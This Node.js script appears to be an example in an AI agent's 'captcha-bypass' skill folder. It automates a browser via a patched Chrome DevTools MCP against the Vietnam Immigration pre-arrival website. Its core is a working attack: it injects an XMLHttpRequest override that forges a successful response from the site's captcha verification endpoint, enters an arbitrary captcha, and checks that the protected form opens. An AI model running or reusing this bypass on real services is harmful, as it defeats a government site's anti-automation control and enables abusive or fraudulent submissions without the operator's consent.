#!/usr/bin/env node
/* eslint-disable */
/**
 * oneclick.cjs — Vietnam Immigration captcha bypass
 *
 * Reproduces the breakthrough documented in
 *   .claude/skills/captcha-bypass-xhr-override/examples/vietnam-immigration-submit-document-captcha-bypass.md
 *
 * Pipeline (all steps use the patched Chrome DevTools MCP via autoConnect):
 *   1. Open home page
 *   2. Click "创建并提交行前信息"
 *   3. Wait for captcha modal
 *   4. Install XHR override (force valid:true on /bio-management-service/captcha/verify)
 *   5. Fill the captcha textbox with any value
 *   6. Click "核实"
 *   7. Wait 2.5s
 *   8. Verify acceptance: modal gone + new GET to /category/findAllActive/nationality fired
 *
 * Environment:
 *   - Patched Chrome DevTools MCP build at $BUILD_ENTRY
 *     (defaults to ~/tools/chrome-devtools-mcp-extension-inspect/build/src/bin/chrome-devtools-mcp.js)
 *   - An already-running Chrome instance that the patched MCP can autoConnect to
 *
 * Run:
 *   node .claude/skills/captcha-bypass-xhr-override/examples/scripts/vietnam-captcha-bypass-oneclick.cjs
 *
 * Exit codes:
 *   0 = success (form rendered)
 *   1 = environment not ready (no Chrome, build not found)
 *   2 = bypass did not take effect (modal still visible after 2.5s)
 */

const os = require('node:os');
const path = require('node:path');
const fs = require('node:fs');
const { pathToFileURL } = require('node:url');
const { createRequire } = require('node:module');

const HOME_URL = 'https://prearrival.immigration.gov.vn/home-page';
const CAPTCHA_PAGE = 'https://prearrival.immigration.gov.vn/apps/submit-document';
const VERIFY_PATH = '/bio-management-service/captcha/verify';

// ============================================================================
// XHR override — paste into evaluate_script as the function body
// ============================================================================
const XHR_OVERRIDE_FN = `() => {
  const OX = window.XMLHttpRequest;
  function NX() {
    const xhr = new OX();
    const oo = xhr.open.bind(xhr);
    const os = xhr.send.bind(xhr);
    let m, u;
    xhr.open = function(method, url, ...rest) { m = method; u = url; return oo(method, url, ...rest); };
    xhr.send = function(body) {
      if (u && u.includes('${VERIFY_PATH}')) {
        const fakeBody = '{"code":"0","success":true,"data":{"valid":true}}';
        Object.defineProperty(xhr, 'readyState',        { configurable: true, get: () => 4 });
        Object.defineProperty(xhr, 'status',            { configurable: true, get: () => 200 });
        Object.defineProperty(xhr, 'responseText',      { configurable: true, get: () => fakeBody });
        Object.defineProperty(xhr, 'response',          { configurable: true, get: () => fakeBody });
        Object.defineProperty(xhr, 'getResponseHeader', { configurable: true, value: (n) => n.toLowerCase() === 'content-type' ? 'application/json' : null });
        Object.defineProperty(xhr, 'getAllResponseHeaders', { configurable: true, value: () => 'content-type: application/json\\r\\n' });
        setTimeout(() => {
          xhr.dispatchEvent(new Event('readystatechange'));
          xhr.dispatchEvent(new Event('load'));
          xhr.dispatchEvent(new Event('loadend'));
        }, 30);
        return;
      }
      return os(body);
    };
    return xhr;
  }
  NX.UNSENT = 0; NX.OPENED = 1; NX.HEADERS_RECEIVED = 2; NX.LOADING = 3; NX.DONE = 4;
  NX.prototype = OX.prototype;
  window.XMLHttpRequest = NX;
  return { installed: true };
}`;

// ============================================================================
// MCP plumbing
// ============================================================================
async function setupClient() {
  const BUILD_ENTRY = process.env.BUILD_ENTRY || path.join(
    os.homedir(), 'tools', 'chrome-devtools-mcp-extension-inspect',
    'build', 'src', 'bin', 'chrome-devtools-mcp.js'
  );

  if (!fs.existsSync(BUILD_ENTRY)) {
    console.error('❌ Patched Chrome DevTools MCP build not found at:');
    console.error('   ' + BUILD_ENTRY);
    console.error('');
    console.error('Install it:');
    console.error('   git clone --branch extension-inspect \\');
    console.error('     https://github.com/Rocke1001feller/chrome-devtools-mcp.git \\');
    console.error('     "$HOME/tools/chrome-devtools-mcp-extension-inspect"');
    console.error('   cd "$HOME/tools/chrome-devtools-mcp-extension-inspect"');
    console.error('   npm install && npm run build');
    process.exit(1);
  }

  const buildRequire = createRequire(BUILD_ENTRY);
  const clientPath = buildRequire.resolve('@modelcontextprotocol/sdk/client/index.js');
  const stdioPath = buildRequire.resolve('@modelcontextprotocol/sdk/client/stdio.js');
  const [{ Client }, { StdioClientTransport }] = await Promise.all([
    import(pathToFileURL(clientPath).href),
    import(pathToFileURL(stdioPath).href),
  ]);

  const transport = new StdioClientTransport({
    command: process.execPath,
    args: [BUILD_ENTRY, '--autoConnect', '--categoryExtensions', '--no-usage-statistics', '--no-performance-crux'],
    stderr: 'pipe',
  });
  const client = new Client({ name: 'vietnam-captcha-bypass', version: '1.0.0' });
  await client.connect(transport);
  return client;
}

async function call(client, name, args = {}) {
  const r = await client.callTool({ name, arguments: args });
  return r?.content?.filter((p) => p.type === 'text').map((p) => p.text).join('\n') || '';
}

// ============================================================================
// Pipeline
// ============================================================================
async function findUidForButton(snapshotText, text) {
  // Each snapshot line looks like:  uid=8_11 button "核实" disableable disabled
  // We match by the inner button text.
  const lines = snapshotText.split('\n');
  for (const line of lines) {
    if (line.includes('button') && line.includes(`"${text}"`)) {
      const m = line.match(/uid=(\S+)/);
      if (m) return m[1];
    }
  }
  return null;
}

async function findUidForTextbox(snapshotText, placeholder) {
  const lines = snapshotText.split('\n');
  for (const line of lines) {
    if (line.includes('textbox') && line.includes(placeholder)) {
      const m = line.match(/uid=(\S+)/);
      if (m) return m[1];
    }
  }
  return null;
}

function log(step, ...args) {
  console.log(`[${step}]`, ...args);
}

async function main() {
  log('init', 'Connecting to patched Chrome DevTools MCP…');
  const client = await setupClient();

  try {
    // 1. Open a fresh page on the home route
    log('1', `Open home page: ${HOME_URL}`);
    const navResp = await call(client, 'new_page', { url: HOME_URL });
    log('1', 'new_page response:', navResp.split('\n')[0]);

    // Find the home page id from the new page list
    const pagesText = await call(client, 'list_pages', {});
    const homePageLine = pagesText.split('\n').find((l) => l.includes('home-page') || l.includes('Pre-Arrival Information'));
    if (!homePageLine) throw new Error('Home page not in page list');
    const pageIdMatch = homePageLine.match(/^(\d+):/);
    if (!pageIdMatch) throw new Error('Could not parse page id');
    const pageId = pageIdMatch[1];
    log('1', `Selected page id = ${pageId}`);

    await call(client, 'select_page', { pageId, bringToFront: true });

    // Wait for the SPA to actually render its content (new_page returns before paint)
    log('1', 'Wait 3s for SPA to render…');
    await new Promise((r) => setTimeout(r, 3000));

    // 2. Click the create button — retry once if the snapshot is empty
    log('2', 'Locate "创建并提交行前信息" button…');
    let snap = await call(client, 'take_snapshot', {});
    let createUid = await findUidForButton(snap, '创建并提交行前信息');
    if (!createUid) {
      log('2', 'Button not found, wait 2s and retry…');
      await new Promise((r) => setTimeout(r, 2000));
      snap = await call(client, 'take_snapshot', {});
      createUid = await findUidForButton(snap, '创建并提交行前信息');
    }
    if (!createUid) {
      log('2', '--- snapshot ---');
      console.log(snap);
      log('2', '--- end snapshot ---');
      throw new Error('Could not find "创建并提交行前信息" button in snapshot');
    }
    log('2', `create button uid = ${createUid}`);

    log('2', 'Click create button…');
    await call(client, 'click', { uid: createUid });

    // 3. Wait for the captcha modal
    log('3', 'Wait for captcha modal (2.5s for navigation + render)…');
    await new Promise((r) => setTimeout(r, 2500));
    snap = await call(client, 'take_snapshot', {});

    if (!snap.includes('验证码验证')) {
      // Try once more with a longer wait
      log('3', 'Modal not yet visible, wait 2s more and retry…');
      await new Promise((r) => setTimeout(r, 2000));
      snap = await call(client, 'take_snapshot', {});
    }
    if (!snap.includes('验证码验证')) {
      log('3', '--- snapshot ---');
      console.log(snap);
      log('3', '--- end snapshot ---');
      throw new Error('Captcha modal did not appear. Did the click navigate?');
    }
    log('3', '✅ Captcha modal is visible.');

    // 4. Install the XHR override
    log('4', 'Install XHR override…');
    const installResp = await call(client, 'evaluate_script', { function: XHR_OVERRIDE_FN });
    if (!installResp.includes('installed')) {
      throw new Error('XHR override install did not return success: ' + installResp);
    }
    log('4', '✅ XHR override installed.');

    // 5. Find the captcha textbox and the verify button — retry if not yet rendered
    log('5', 'Locate captcha textbox and verify button…');
    let textboxUid = null;
    let verifyUid = null;
    for (let i = 0; i < 3 && (!textboxUid || !verifyUid); i++) {
      snap = await call(client, 'take_snapshot', {});
      textboxUid = await findUidForTextbox(snap, '请输入验证码');
      verifyUid = await findUidForButton(snap, '核实');
      if (!textboxUid || !verifyUid) {
        log('5', `attempt ${i + 1}: textbox=${!!textboxUid} verify=${!!verifyUid} — wait 1.5s`);
        await new Promise((r) => setTimeout(r, 1500));
      }
    }
    if (!textboxUid || !verifyUid) {
      log('5', '--- snapshot ---');
      console.log(snap);
      log('5', '--- end snapshot ---');
      throw new Error('Could not find textbox / verify button');
    }
    log('5', `textbox uid = ${textboxUid}, verify uid = ${verifyUid}`);

    // 6. Fill the textbox
    log('6', 'Fill the captcha textbox…');
    await call(client, 'fill', { uid: textboxUid, value: 'XY99ZZ' });

    // Verify the button became enabled
    const stateResp = await call(client, 'evaluate_script', {
      function: `() => {
        const btn = [...document.querySelectorAll('button')].find((b) => b.innerText?.trim() === '核实');
        return { btnDisabled: btn?.disabled };
      }`,
    });
    log('6', 'button state after fill:', stateResp.trim());

    // 7. Click verify
    log('7', 'Click "核实"…');
    await call(client, 'click', { uid: verifyUid });

    // 8. Wait and check acceptance
    log('8', 'Wait 2.5s for the page to react…');
    await new Promise((r) => setTimeout(r, 2500));

    const finalResp = await call(client, 'evaluate_script', {
      function: `() => ({
        url: location.href,
        hasDialog: !!document.querySelector('h2'),
        bodyText: document.body.innerText.slice(0, 500),
      })`,
    });
    log('8', 'Final state:', finalResp.replace(/\n/g, ' | '));

    const finalSnap = await call(client, 'take_snapshot', {});
    const hasNationalityCombo = finalSnap.includes('combobox') && finalSnap.includes('国籍');
    const hasVerifyButtonStill = finalSnap.includes('"核实"');
    const hasNextButton = finalSnap.includes('下一个');

    log('result', '---');
    log('result', `URL still on captcha page: ${finalResp.includes(CAPTCHA_PAGE)}`);
    log('result', `h2 (dialog) gone:          ${!finalResp.includes('hasDialog: true')}`);
    log('result', `Nationality combobox:      ${hasNationalityCombo}`);
    log('result', `"下一个" button visible:    ${hasNextButton}`);
    log('result', `"核实" still visible:      ${hasVerifyButtonStill}`);
    log('result', '---');

    if (hasNationalityCombo && hasNextButton && !hasVerifyButtonStill) {
      log('DONE', '✅ Bypass successful — form is rendered.');
      process.exit(0);
    } else {
      log('DONE', '❌ Bypass did not take effect — form is NOT rendered.');
      log('DONE', 'Snapshot:');
      console.log(finalSnap);
      process.exit(2);
    }
  } finally {
    await client.close();
  }
}

main().catch((err) => {
  console.error('FATAL:', err.stack || err.message || err);
  process.exit(1);
});
